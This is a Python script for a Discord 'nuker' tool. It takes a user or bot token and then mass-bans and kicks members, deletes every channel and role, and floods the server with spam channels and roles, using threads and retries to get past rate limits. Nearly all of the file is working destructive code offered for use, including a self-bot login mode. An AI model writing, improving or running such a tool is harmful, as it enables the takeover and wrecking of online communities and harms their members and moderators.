import requests
import os
import sys
import threading
import time
import json
import asyncio
import discord
import aiohttp
from colorama import Fore
import random
from discord import Webhook
from discord.ext import commands

os.system(f'cls & mode 85,20 & title Token Login')

token = input(f'Token: ')


os.system('cls')

def check_token():
    if requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:
        return "user"
    else:
        return "bot"




token_type = check_token()
intents = discord.Intents.all()
intents.members = True

if token_type == "user":
    headers = {'Authorization': f'{token}'}
    client = commands.Bot(command_prefix=">", case_insensitive=False, self_bot=True, intents=intents)
elif token_type == "bot":
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(command_prefix=">", case_insensitive=False, intents=intents)

client.remove_command("help")

class Uzzii:

    def __init__(self):
        self.colour = '\x1b[38;5;56m'

    def BanMembers(self, guild, member):
        while True:
            r = requests.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{member}", headers=headers)
            if 'retry_after' in r.text:
                b = r.json()
                print(f"{Fore.BLUE}RateLimited, retrying {Fore.CYAN}in {b['retry_after']} seconds")
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.CYAN}Banned {Fore.WHITE}{member.strip()}")
                    break
                else:
                    break

    def KickMembers(self, guild, member):
        while True:
            r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/members/{member}", headers=headers)
            if 'retry_after' in r.text:
                b = r.json()
                print(f"{Fore.CYAN}RateLimited, retrying {Fore.BLUE}in {b['retry_after']} seconds")
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.BLUE}Kicked {Fore.WHITE}{member.strip()}")
                    break
                else:
                    break

    def DeleteChannels(self, guild, channel):
        while True:
            r = requests.delete(f"https://discord.com/api/v9/channels/{channel}", headers=headers)
            if 'retry_after' in r.text:
                b = r.json()
                print(f"{Fore.CYAN}RateLimited, retrying {Fore.BLUE}in {b['retry_after']} seconds")
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.BLUE}Deleted {Fore.WHITE}{channel.strip()}")
                    break
                else:
                    break
          
    def DeleteRoles(self, guild, role):
        while True:
            r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{role}", headers=headers)
            if 'retry_after' in r.text:
                b = r.json()
                print(f"{Fore.CYAN}RateLimited, retrying {Fore.BLUE}in {b['retry_after']} seconds")
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.BLUE}Deleted {Fore.WHITE}{role.strip()}")
                    break
                else:
                    break

    def SpamChannels(self, guild, name):
        while True:
            json = {'name': name, 'type': 0}
            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/channels', headers=headers, json=json)
            if 'retry_after' in r.text:
                b = r.json()
                print(f"{Fore.BLUE}RateLimited, retrying {Fore.CYAN}in {b['retry_after']} seconds")
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"Created Channel {Fore.BLUE}{name}")
                    break
                else:
                    break

    def SpamRoles(self, guild, name):
        while True:
            json = {'name': name}
            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/roles', headers=headers, json=json)
            if 'retry_after' in r.text:
                b = r.json()
                print(f"{Fore.CYAN}RateLimited, retrying {Fore.BLUE}in {b['retry_after']} seconds")
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"Created role {Fore.BLUE}{name}")
                    break
                else:
                    break

    async def Scrape(self):
        guild = input(f'> {Fore.WHITE}Guild Id: ')
        await client.wait_until_ready()
        guildOBJ = client.get_guild(int(guild))
        members = await guildOBJ.chunk()

        try:
            os.remove("Scraped/members.txt")
            os.remove("Scraped/channels.txt")
            os.remove("Scraped/roles.txt")
        except:
            pass

        membercount = 0
        with open('Scraped/members.txt', 'a') as m:
            for member in members:
                m.write(str(member.id) + "\n")
                membercount += 1
            print(f"\nScraped Members: {Fore.BLUE}{membercount}")
            m.close()

        channelcount = 0
        with open('Scraped/channels.txt', 'a') as c:
            for channel in guildOBJ.channels:
                c.write(str(channel.id) + "\n")
                channelcount += 1
            print(f"\n{Fore.BLUE}Scraped Channels: {Fore.WHITE}{channelcount}")
            c.close()

        rolecount = 0
        with open('Scraped/roles.txt', 'a') as r:
            for role in guildOBJ.roles:
                r.write(str(role.id) + "\n")
                rolecount += 1
            print(f"\n{Fore.BLUE}Scraped Roles: {Fore.CYAN}{rolecount}")
            r.close()

    async def Nuke(self):
        guild = input(f'Guild Id: ')
        channel_name = input(f"Channel name: ")
        channel_amount = input(f"Channel amount: ")
        role_name = input(f"Role name: ")
        role_amount = input(f"Role amount: ")
        print()

        members = open('Scraped/members.txt')
        channels = open('Scraped/channels.txt')
        roles = open('Scraped/roles.txt')

        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
        for i in range(int(channel_amount)):
            threading.Thread(target=self.SpamChannels, args=(guild, channel_name,)).start()
        for i in range(int(role_amount)):
            threading.Thread(target=self.SpamRoles, args=(guild, role_name,)).start()
        members.close()
        channels.close()
        roles.close()

    async def BanAll(self):
        guild = input(f'{Fore.BLUE}Guild {Fore.WHITE}Id: ')
        print()
        members = open('Scraped/members.txt')
        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
        members.close()

    async def KickAll(self):
        guild = input(f'{Fore.CYAN}Guild {Fore.WHITE}Id: ')
        print()
        members = open('Scraped/members.txt')
        for member in members:
            threading.Thread(target=self.KickMembers, args=(guild, member,)).start()
        members.close()

    async def ChannelDelete(self):
        guild = input(f'{Fore.BLUE}Guild {Fore.WHITE}Id: ')
        print()
        channels = open('Scraped/channels.txt')
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
        channels.close()

    async def RoleDelete(self):
        guild = input(f'{Fore.BLUE}Guild {Fore.WHITE}Id: ')
        print()
        roles = open('Scraped/roles.txt')
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
        roles.close()

    async def ChannelSpam(self):
        guild = input(f'{Fore.BLUE}Guild {Fore.WHITE}Id: ')
        name = input(f"{Fore.CYAN}Channel {Fore.WHITE}Name: ")
        amount = input(f"{Fore.BLUE}amo{Fore.CYAN}unt: ")
        print()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamChannels, args=(guild, name,)).start()

    async def RoleSpam(self):
        guild = input(f'{Fore.BLUE}Guild {Fore.WHITE}Id: ')
        name = input(f"{Fore.CYAN}Role {Fore.WHITE}Name: ")
        amount = input(f"{Fore.CYAN}amo{Fore.BLUE}unt: ")
        print()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamRoles, args=(guild, name,)).start()

    async def PruneMembers(self):
        guild = input(f'Guild Id: ')
        print()
        await guild.prune_members(days=1, compute_prune_count=False, roles=guild.roles)

  

    async def Menu(self):
        os.system(f'cls & mode 60,50 & title Connected: {client.user}')
        print(f'''
        

  {Fore.BLUE})\   )\     /`-.   )\    /(      .'(   )\.---.   )\   )\  
 {Fore.BLUE}(  ',/ /   ,' _  \  \ (_.' /  ,') \  ) (   ,-._( (  ',/ /  
  {Fore.BLUE})    (   (  '-' (   )  _.'  (  '-' (   \  '-,    )    (   
 {Fore.CYAN}(  \(\ \   )   _  )  / /      ) .-.  )   ) ,-`   (  \(\ \  
  {Fore.CYAN}`.) /  ) (  ,' ) \ (  \     (  ,  ) \  (  ``-.   `.) /  ) 
      '.(   )/    )/  ).'      )/    )/   )..-.(       '.(  
                                                           

                  
 {Fore.CYAN}[1] Massban                              [6] Scrape
 {Fore.CYAN}[2] MassKick                             [7] MassChannels
 {Fore.CYAN}[3] Delete Channels                      [8] MassRoles  
 {Fore.BLUE}[4] Delete Roles                         [9] Nuke Server       
 {Fore.BLUE}[5] Prune Members                        [X] Exit
        
        
        ''')

        choice = input(f'{Fore.BLUE}[{Fore.CYAN}!{Fore.BLUE}] {Fore.WHITE}Choose: ')
        if choice == '1':
            await self.BanAll()
            time.sleep(2)
            await self.Menu()
        elif choice == '2':
            await self.KickAll()
            time.sleep(2)
            await self.Menu()
        elif choice == '5':
            await self.PruneMembers()
            time.sleep(2)
            await self.Menu()
        elif choice == '4':
            await self.RoleDelete()
            time.sleep(2)
            await self.Menu()
        elif choice == '3':
            await self.ChannelDelete()
            time.sleep(2)
            await self.Menu()
        elif choice == '8':
            await self.RoleSpam()
            time.sleep(2)
            await self.Menu()
        elif choice == '7':
            await self.ChannelSpam()
            time.sleep(2)
            await self.Menu()
        elif choice == '9':
            await self.Nuke()
            time.sleep(2)
            await self.Menu()
        elif choice == '6':
            await self.Scrape()
            time.sleep(3)
            await self.Menu()
        elif choice == 'X' or choice == 'x':
            os._exit(0)

    @client.event
    async def on_ready():
        await Uzzii().Menu()
            
    def Startup(self):
        try:
            if token_type == "user":
                client.run(token, bot=False)
            elif token_type == "bot":
                client.run(token)
        except:
            print(f'{self.colour}> \033[37mInvalid Token')
            input()
            os._exit(0)

if __name__ == "__main__":
    Uzzii().Startup()
    